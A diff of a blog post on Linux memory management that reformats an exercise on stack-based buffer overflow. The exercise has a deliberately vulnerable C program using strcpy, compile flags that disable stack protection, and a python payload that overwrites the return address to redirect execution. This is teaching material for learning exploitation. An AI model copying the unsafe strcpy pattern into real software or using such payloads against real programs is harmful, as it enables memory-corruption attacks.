@@ -2,7 +2,7 @@
 layout: post
 title: Linux Memory Management
 categories: Linux 
-tags: [linux, kernel]
+tags: [linux, memory]
 ---
 ## Memory management technic and virtual memory
 
@@ -358,77 +358,76 @@ tags: [linux, kernel]
 - Slab Allocator
   - Internal Fragmentation
 
+## [Exercise 2. Answer: Understanding Stack based buffer overflow](<https://payatu.com/blog/Siddharth-Bezalwar/understanding-stack-based-buffer-overflow>){:target="_blank"}
 
-- [Exercise 2. Answer: Understanding Stack based buffer overflow](<https://payatu.com/blog/Siddharth-Bezalwar/understanding-stack-based-buffer-overflow>){:target="_blank"}
+```cpp
+#include <string.h>
+#include <stdio.h>
 
-  ```cpp
-  #include <string.h>
-  #include <stdio.h>
+void function2() {
+  printf(“Execution flow changed\n”);
+}
 
-  void function2() {
-    printf(“Execution flow changed\n”);
-  }
+void function1(char *str){
+  char buffer[5];
+  strcpy(buffer, str);  // break point 1.
+}                       // break point 2.
 
-  void function1(char *str){
-    char buffer[5];
-    strcpy(buffer, str);  // break point 1.
-  }                       // break point 2.
+void main(int argc, char *argv[])
+{
+  function1(argv[1]);   // break point 3.
+  printf(“Executed normally\n”);
+}
+```
 
-  void main(int argc, char *argv[])
-  {
-    function1(argv[1]);   // break point 3.
-    printf(“Executed normally\n”);
-  }
-  ```
+```terminal
+gcc -g -fno-stack-protector -z execstack -o bufferoverflow overflow.c
+```
+
+- -g tells GCC to add extra information for GDB
+- -fno-stack-protector flag to turn off stack protection mechanism
+- -z execstack, it makes stack executable.
+
+```terminal
+$ ./bufferoverflow AAAA
+Executed normally
+$ ./bufferoverflow AAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+```
+
+- break point 3.
+
+  ![break point 3.]({{ "/assets/images/posts/2020-12-07/breakpoint3-1.png" | relative_url }})
+  
+- break point 1.
+
+  ![break point 1.]({{ "/assets/images/posts/2020-12-07/breakpoint1.png" | relative_url }})
+
+- break point 2.
+
+  ![break point 2.]({{ "/assets/images/posts/2020-12-07/breakpoint2.png" | relative_url }})
+
+- Return address, EBP and ESP on function stack frame
+
+  ![EBP and ESP on function stack frame]({{ "/assets/images/posts/2020-12-07/esp_ebp_on_func_call_stack.png" | relative_url }})
+
+- break point 3.
+
+  When you overwrite the return address with As you will get segmentation fault with message 0x41414141 in ?? () in GDB. This means you successfully overwritten the return address.
+
+  ![break point 3.]({{ "/assets/images/posts/2020-12-07/breakpoint3-2.png" | relative_url }})
+
+- Hijacking Execution
+  - Find the function2 address
+
+    ![function 2 address]({{ "/assets/images/posts/2020-12-07/function2address.png" | relative_url }})
+
+  - Overwrite the Return address with the function 2 address
+
+    ![run with function 2 address]({{ "/assets/images/posts/2020-12-07/run_function2address.png" | relative_url }})
 
   ```terminal
-  gcc -g -fno-stack-protector -z execstack -o bufferoverflow overflow.c
-  ```
-
-  - -g tells GCC to add extra information for GDB
-  - -fno-stack-protector flag to turn off stack protection mechanism
-  - -z execstack, it makes stack executable.
-
-  ```terminal
-  $ ./bufferoverflow AAAA
-  Executed normally
-  $ ./bufferoverflow AAAAAAAAAAAAAAAAAAAAAA
+  $ ./bufferoverflow $(python -c 'print "A"*17 + "\x1b\x84\x04\x08"')
+  Execution flow changed
   Segmentation fault
   ```
-
-  - break point 3.
-
-    ![break point 3.]({{ "/assets/images/posts/2020-12-07/breakpoint3-1.png" | relative_url }})
-    
-  - break point 1.
-
-    ![break point 1.]({{ "/assets/images/posts/2020-12-07/breakpoint1.png" | relative_url }})
-
-  - break point 2.
-
-    ![break point 2.]({{ "/assets/images/posts/2020-12-07/breakpoint2.png" | relative_url }})
-
-  - Return address, EBP and ESP on function stack frame
-
-    ![EBP and ESP on function stack frame]({{ "/assets/images/posts/2020-12-07/esp_ebp_on_func_call_stack.png" | relative_url }})
-
-  - break point 3.
-
-    When you overwrite the return address with As you will get segmentation fault with message 0x41414141 in ?? () in GDB. This means you successfully overwritten the return address.
-
-    ![break point 3.]({{ "/assets/images/posts/2020-12-07/breakpoint3-2.png" | relative_url }})
-
-  - Hijacking Execution
-    - Find the function2 address
-
-      ![function 2 address]({{ "/assets/images/posts/2020-12-07/function2address.png" | relative_url }})
-
-    - Overwrite Return address with the function 2 address
-
-      ![run with function 2 address]({{ "/assets/images/posts/2020-12-07/run_function2address.png" | relative_url }})
-
-    ```terminal
-    $ ./bufferoverflow $(python -c 'print "A"*17 + "\x1b\x84\x04\x08"')
-    Execution flow changed
-    Segmentation fault
-    ```
